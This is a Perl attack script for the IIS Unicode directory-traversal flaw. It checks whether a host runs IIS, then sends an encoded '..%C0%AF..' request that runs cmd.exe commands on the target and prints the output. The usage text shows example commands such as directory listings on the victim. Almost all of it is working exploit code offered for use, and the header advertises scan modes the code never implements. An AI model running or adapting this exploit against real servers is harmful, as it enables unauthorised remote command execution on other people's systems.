#!/usr/bin/perl
#
# portable unicode scanner. 
# johnny@ihackstuff.com
#
# usage:
#	unicode <Scan Type, Input> <Port>
#
#	unicode -h 127.0.0.1 80
#	 -> scan one host on port 80
#
#	unicode -l host.list 8080
#	 -> get hosts out of a file, use port 8080
#
#	unicode -s 198.168.10. 80
# 	 -> scan class c (198.168.10.*), port 80
############################################################

# for www_svr
use LWP::Simple;

# for socket
use IO::Socket;

print "\nunicode portable\n";
print "johnny\@ihackstuff.com\n\n";

if (@ARGV ne 3)
{
print'usage: unicode <target> <port> <command>

	unicode 127.0.0.1 80 "winnt/system32/cmd.exe?/c+dir"
	 -> scan one host on port 80, execute a dir 
       -> in \winnt\system32

	unicode 127.0.0.1 80 "winnt/system32/cmd.exe?/c+dir%20c:\"
	 -> scan one host on port 80, execute a dir 
       -> in c:\
';
  exit();
}

$command = $ARGV[2];
$port = $ARGV[1];
$host = $ARGV[0];
$victim = $host;
#$scan_mode = $ARGV[0];
$count = 0;
@active_ports;


#################################################
# Main
#################################################
printf "Scanning $victim:$port...\n";
check_root();
exit();


#################################################
# The routine for scanning the host(s)
#################################################
sub check_root
{
$open = check_port($victim, $port);
   if ($open ne 0) 
   {
     print "port open...";
     $header = www_svr($victim);
     #print "Header: $header";
     if ( $header =~ "IIS" ) 
     { 
        print "found IIS..."; 

        $bad = checkOut($victim, $port, 
		            "GET /scripts/..%C0%AF../$command HTTP/1.0\n\n");
	  if ( $bad eq 1 ) { print "success!\n"; }
        
#
     }
     else { print "no IIS server.\n"; }
   }
   else
   {
      print "port closed.\n";
   }
}



#################################################
# Get name of WWW Server
#################################################
sub www_svr {
  my ($host) = @_;
  ($content_type, $document_length, $modified_time,$expires, 
    $server) = head("http://$host");

  return $server;
}



#################################################
# Check to see if a port is open
#################################################
sub check_port {
  my ($victim,$port) = @_;
  
  $remote = IO::Socket::INET -> new (
             Proto => "tcp",
             PeerAddr => $victim,
             PeerPort => $port
             ) ;
  if ($remote) { 
    close $remote;
    push @active_ports, $port;
    return 1;
  }
  else { return 0; }  
}


#################################################
# Send data to a port, read back all data
#################################################
sub checkOut {
  my ($host, $port, $send) = @_;
  #print "data read $host...\n";
  $remote = IO::Socket::INET -> new (
          Proto => "tcp",
          PeerAddr => $host,
          PeerPort => $port
          );
  print $remote $send;
  @lines = <$remote>;
  close $remote;
  print "\n";
  foreach $line (@lines) 
  { 
    print "$line";
    #if ( $line =~ $token ) { return 1; }
  }
  return 0;
  print "\n";
}

#################################################
# Read a file list
#################################################
sub get_file
{
open (LISTE,"$host");
while ($ente = <LISTE>) {
chop $ente; 
$count++;
@hosts[$count] = $ente;
}
close(LISTE);
$totaly = $count;
$count = 0;
return 0;
}

